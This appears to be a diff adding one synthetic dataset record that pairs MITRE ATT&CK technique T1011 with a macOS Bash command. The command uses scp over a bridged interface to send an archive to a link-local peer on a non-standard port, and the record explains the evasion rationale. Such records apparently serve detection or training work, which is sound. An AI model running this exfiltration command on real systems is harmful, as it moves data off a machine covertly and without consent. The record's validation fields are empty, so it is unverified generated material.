@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
+  "explanation": "Uses SSH file copy bound to the bridge0 interface IPv6 address and a high custom port to move data over a bridged, non-default medium, aligning with T1011 by avoiding the primary interface.",
+  "rationale_steps": [
+    "Obtain the IPv6 address of bridge0 via ipconfig to select a secondary medium.",
+    "Bind the SSH client to that address to force traffic over bridge0.",
+    "Transfer data to a link-local peer on a non-standard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-8073e46c",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
